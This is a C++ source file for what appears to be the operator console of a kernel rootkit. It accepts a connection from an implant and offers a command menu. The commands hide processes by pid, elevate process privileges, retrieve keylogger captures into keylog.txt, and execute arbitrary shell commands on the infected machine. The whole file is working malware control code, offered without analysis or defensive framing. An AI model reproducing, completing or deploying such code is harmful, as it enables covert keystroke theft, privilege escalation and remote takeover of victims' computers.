#include "Server.h"
#include "common.h"
#include <sstream>
#include <fstream>

void printMenu();
void awaitCommand(Server::RootkitServer* server);

int main(int argc,char* argv[]) {

	std::cout <<R"###(
______            _   _    _ _     _____ _ _            _   
| ___ \          | | | |  (_) |   /  __ \ (_)          | |  
| |_/ /___   ___ | |_| | ___| |_  | /  \/ |_  ___ _ __ | |_ 
|    // _ \ / _ \| __| |/ / | __| | |   | | |/ _ \ '_ \| __|
| |\ \ (_) | (_) | |_|   <| | |_  | \__/\ | |  __/ | | | |_ 
\_| \_\___/ \___/ \__|_|\_\_|\__|  \____/_|_|\___|_| |_|\__|
                                                                                                          
)###" <<std::endl;


	Server::RootkitServer server;

	std::cout << "[+] Waiting on connection..." << std::endl;


	bool status = server.Accept();

	if (!status) {
		std::cout << "[+] Couldn't accept a socket connection." << std::endl;
		return -1;
	}

	std::cout << "[+] Got connection!" << std::endl;

	printMenu();
	awaitCommand(&server);



	//server destructor will be called
	//will close sockets and call WSAcleanup
}


void awaitCommand(Server::RootkitServer* server) {

	while (true) {

		std::cout << "[+] Enter a command to execute" << std::endl;
		std::cout << ">>" << std::flush;
		std::string command;
		std::cin >> command;


		if (command == "$testConnection") {
			std::cout << "[+] Enter a message you would like to send to the kernel" << std::endl;
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server->SendText("$testConnection " + command);

			if (!status)
				return;

			std::string input;

			status = server->ReceiveText(input);
			if (!status)
				return;

			std::cout << input << std::endl;
		}
		else if (command == "$hideProcess") {
			std::cout << "[+] Enter the pid of a process you would like to hide" << std::endl;
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server->SendText("$hideProcess " + command);

			if (!status)
				return;

			std::string input;

			status = server->ReceiveText(input);
			if (!status)
				return;

			std::cout << input << std::endl;
		}
		else if (command == "$elevateProcess") {
			std::cout << "[+] Enter the pid of a process whose privilages you would like to elevate" << std::endl;
			std::cout << ">>" << std::flush;
			std::cin >> command;

			bool status = server->SendText("$elevateProcess " + command);

			if (!status)
				return;

			std::string input;

			status = server->ReceiveText(input);
			if (!status)
				return;

			std::cout << input << std::endl;
		}
		else if (command == "$keylogger") {

			bool status = server->SendText("$keylogger");

			if (!status)
				return;

			std::string input;

			status = server->ReceiveText(input);
			if (!status)
				return;

			std::cout << "[+] keylogger input saved in keylog.txt" << std::endl;
			std::ofstream logfile("keylog.txt", std::ios::app);
			logfile << input;
			logfile.close();
		}
		else if (command == "$shellExecute") {
			std::cout << "[+] Enter the command you would like to execute" << std::endl;
			std::cout << ">>" << std::flush;
			std::getline(std::cin >> std::ws, command);

			std::cout << command <<'\n';

			bool status = server->SendText("$shellExecute " + command);

			if (!status)
				return;

			std::string input;

			status = server->ReceiveText(input);
			if (!status)
				return;

			std::cout << input << std::endl;
		}
		else if (command == "$help") {
			printMenu();
		}
		else if (command == "$exit") {
			server->SendText("$exit");
			break;
		}
		else {
			std::cout << "command not recognized! try again" << std::endl << std::endl;
		}

	}
}
void printMenu() {
	std::cout << "[+] list of commands:" << std::endl << std::endl;

	std::cout << "$testConnection - test connection with driver" << std::endl;
	std::cout << "$hideProcess    - hide a process by pid" << std::endl;
	std::cout << "$elevateProcess - elevate privilages of a process by pid" << std::endl;
	std::cout << "$keylogger      - get recent keylogger output" << std::endl;
	std::cout << "$shellExecute   - execute a shell command" << std::endl;
	std::cout << "$help           - print this menu" << std::endl;
	std::cout << "$exit           - end connection with rootkit and exit" << std::endl << std::endl;
}

